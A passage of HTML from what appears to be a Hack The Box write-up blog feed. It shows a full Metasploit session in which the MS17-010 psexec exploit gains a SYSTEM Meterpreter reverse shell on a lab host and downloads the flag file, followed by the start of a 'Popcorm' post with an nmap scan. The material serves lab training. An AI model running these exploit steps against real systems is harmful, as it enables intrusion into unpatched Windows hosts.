</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q

msf5 &gt; show search ms17_010

Matching <span style="color:#8be9fd;font-style:italic">Modules</span>
<span style="color:#ff79c6">================</span>

   <span style="color:#6272a4">#  Name                                           Disclosure Date  Rank     Check  Description</span>
   -  ----                                           ---------------  ----     -----  -----------
   <span style="color:#bd93f9">0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   <span style="color:#bd93f9">1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   <span style="color:#bd93f9">2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   <span style="color:#bd93f9">3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style="color:#ff79c6">for</span> Win8+
   <span style="color:#bd93f9">4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


msf5 &gt; use exploit/windows/smb/ms17_010_psexec
msf5 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LPORT <span style="color:#bd93f9">8000</span>
<span style="color:#8be9fd;font-style:italic">LPORT</span> <span style="color:#ff79c6">=</span>&gt; <span style="color:#bd93f9">8000</span>
msf5 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LHOST 10.10.14.36
<span style="color:#8be9fd;font-style:italic">LHOST</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.36
msf5 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> RHOSTS 10.10.10.4
<span style="color:#8be9fd;font-style:italic">RHOSTS</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.4
msf5 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; show options

Module options <span style="color:#ff79c6">(</span>exploit/windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span>:

   Name                  Current Setting                                                              Required  Description
   ----                  ---------------                                                              --------  -----------
   DBGTRACE              <span style="color:#8be9fd;font-style:italic">false</span>                                                                        yes       Show extra debug trace info
   LEAKATTEMPTS          <span style="color:#bd93f9">99</span>                                                                           yes       How many <span style="color:#8be9fd;font-style:italic">times</span> to try to leak transaction
   NAMEDPIPE                                                                                          no        A named pipe that can be connected to <span style="color:#ff79c6">(</span>leave blank <span style="color:#ff79c6">for</span> auto<span style="color:#ff79c6">)</span>
   NAMED_PIPES           /opt/metasploit-framework/embedded/framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                10.10.10.4                                                                   yes       The target host<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#f1fa8c">&#39;file:&lt;path&gt;&#39;</span>
   RPORT                 <span style="color:#bd93f9">445</span>                                                                          yes       The Target port
   SERVICE_DESCRIPTION                                                                                no        Service description to to be used on target <span style="color:#ff79c6">for</span> pretty listing
   SERVICE_DISPLAY_NAME                                                                               no        The service display name
   SERVICE_NAME                                                                                       no        The service name
   SHARE                 ADMIN$                                                                       yes       The share to connect to, can be an admin share <span style="color:#ff79c6">(</span>ADMIN$,C$,...<span style="color:#ff79c6">)</span> or a normal read/write folder share
   SMBDomain             .                                                                            no        The Windows domain to use <span style="color:#ff79c6">for</span> authentication
   SMBPass                                                                                            no        The password <span style="color:#ff79c6">for</span> the specified username
   SMBUser                                                                                            no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   <span style="color:#bd93f9">0</span>   Automatic


msf5 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; run

<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.36:8000:-  -
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:8000
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Target OS: Windows 5.1
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Filling barrel with fish... <span style="color:#ff79c6">done</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - 	<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Preparing dynamite...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - 		<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Trying stick <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>x86<span style="color:#ff79c6">)</span>...Boom!
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - 	<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Successfully Leaked Transaction!
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - 	<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Successfully caught Fish-in-a-barrel
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e11010
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Built a write-what-where primitive...
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Selecting native target
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Uploading payload... iJRKhIQV.exe
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Created <span style="color:#f1fa8c">\i</span>JRKhIQV.exe...
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Service started successfully...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">180291</span> bytes<span style="color:#ff79c6">)</span> to 192.168.99.1
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:8000 -&gt; 192.168.99.1:52467<span style="color:#ff79c6">)</span> at 2020-02-21 06:24:42 +0000
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.10.10.4:445 - Deleting <span style="color:#f1fa8c">\i</span>JRKhIQV.exe...

meterpreter &gt; dir C:
Listing: C:
<span style="color:#ff79c6">===========</span>

Mode                Size               Type  Last modified                    Name
----                ----               ----  -------------                    ----
100777/rwxrwxrwx    <span style="color:#bd93f9">0</span>                  fil   2017-03-16 05:30:44 +0000        AUTOEXEC.BAT
100666/rw-rw-rw-    <span style="color:#bd93f9">0</span>                  fil   2017-03-16 05:30:44 +0000        CONFIG.SYS
40777/rwxrwxrwx     <span style="color:#bd93f9">0</span>                  dir   2017-03-16 05:20:29 +0000        Documents and Settings
100444/r--r--r--    <span style="color:#bd93f9">0</span>                  fil   2017-03-16 05:30:44 +0000        IO.SYS
100444/r--r--r--    <span style="color:#bd93f9">0</span>                  fil   2017-03-16 05:30:44 +0000        MSDOS.SYS
100555/r-xr-xr-x    <span style="color:#bd93f9">47564</span>              fil   2008-04-13 20:13:04 +0000        NTDETECT.COM
40555/r-xr-xr-x     <span style="color:#bd93f9">0</span>                  dir   2017-03-16 05:20:57 +0000        Program Files
40777/rwxrwxrwx     <span style="color:#bd93f9">0</span>                  dir   2017-03-16 05:20:30 +0000        System Volume Information
40777/rwxrwxrwx     <span style="color:#bd93f9">0</span>                  dir   2017-03-16 05:18:34 +0000        WINDOWS
100666/rw-rw-rw-    <span style="color:#bd93f9">211</span>                fil   2017-03-16 05:20:02 +0000        boot.ini
100444/r--r--r--    <span style="color:#bd93f9">250048</span>             fil   2008-04-13 22:01:44 +0000        ntldr
60411620/rw--w----  <span style="color:#bd93f9">48691528838709232</span>  fif   1551977431-11-16 03:18:24 +0000  pagefile.sys

meterpreter &gt; dir <span style="color:#f1fa8c">&#34;C:\Documents and Settings&#34;</span>
Listing: C:<span style="color:#f1fa8c">\D</span>ocuments and <span style="color:#8be9fd;font-style:italic">Settings</span>
<span style="color:#ff79c6">==================================</span>

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  <span style="color:#bd93f9">0</span>     dir   2017-03-16 06:07:20 +0000  Administrator
40777/rwxrwxrwx  <span style="color:#bd93f9">0</span>     dir   2017-03-16 05:20:29 +0000  All Users
40777/rwxrwxrwx  <span style="color:#bd93f9">0</span>     dir   2017-03-16 05:20:29 +0000  Default User
40777/rwxrwxrwx  <span style="color:#bd93f9">0</span>     dir   2017-03-16 05:32:52 +0000  LocalService
40777/rwxrwxrwx  <span style="color:#bd93f9">0</span>     dir   2017-03-16 05:32:42 +0000  NetworkService
40777/rwxrwxrwx  <span style="color:#bd93f9">0</span>     dir   2017-03-16 05:33:41 +0000  john

meterpreter &gt; getuid
Server username: NT AUTHORITY<span style="color:#f1fa8c">\S</span>YSTEM
meterpreter &gt; dir <span style="color:#f1fa8c">&#34;C:\Documents and Settings\Administrator\Desktop&#34;</span>
Listing: C:<span style="color:#f1fa8c">\D</span>ocuments and Settings<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop
<span style="color:#ff79c6">========================================================</span>

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  <span style="color:#bd93f9">32</span>    fil   2017-03-16 06:18:19 +0000  root.txt

meterpreter &gt; cat  <span style="color:#f1fa8c">&#34;C:\Documents and Settings\john\Desktop\user.txt&#34;</span>
meterpreter &gt; download <span style="color:#f1fa8c">&#34;C:\Documents and Settings\Administrator\Desktop\root.txt&#34;</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloading: C:<span style="color:#f1fa8c">\D</span>ocuments and Settings<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\r</span>oot.txt -&gt; root.txt
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloaded 32.00 B of 32.00 B <span style="color:#ff79c6">(</span>100.0%<span style="color:#ff79c6">)</span>: C:<span style="color:#f1fa8c">\D</span>ocuments and Settings<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\r</span>oot.txt -&gt; root.txt
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> download   : C:<span style="color:#f1fa8c">\D</span>ocuments and Settings<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\r</span>oot.txt -&gt; root.txt

</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Popcorm</title><link>https://0xade1.github.io/posts/2020/04/htb-popcorm/</link><pubDate>Sat, 11 Apr 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/04/htb-popcorm/</guid><description>Reckon Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.60 scan initiated Fri Feb 21 14:21:08 2020 as: nmap -A -T4 -oA nmap/popcorn 10.10.10.6 Nmap scan report for 10.10.10.6 Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA) |_ 2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA) 80/tcp open http Apache httpd 2.</description><content type="html"><![CDATA[<h1 id="reckon">Reckon</h1>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 21 14:21:08 2020 as: nmap -A -T4 -oA nmap/popcorn 10.10.10.6</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.6
Host is up <span style="color:#ff79c6">(</span>0.26s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">1024</span> 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 <span style="color:#ff79c6">(</span>DSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">2048</span> aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
80/tcp open  http    Apache httpd 2.2.12 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
|_http-server-header: Apache/2.2.12 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
|_http-title: Site doesn&#39;t have a title <span style="color:#ff79c6">(</span>text/html<span style="color:#ff79c6">)</span>.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Fri Feb 21 14:21:49 2020 -- 1 IP address (1 host up) scanned in 41.56 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>Looking for nmap vulnerabilities lead to nothing interesting</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
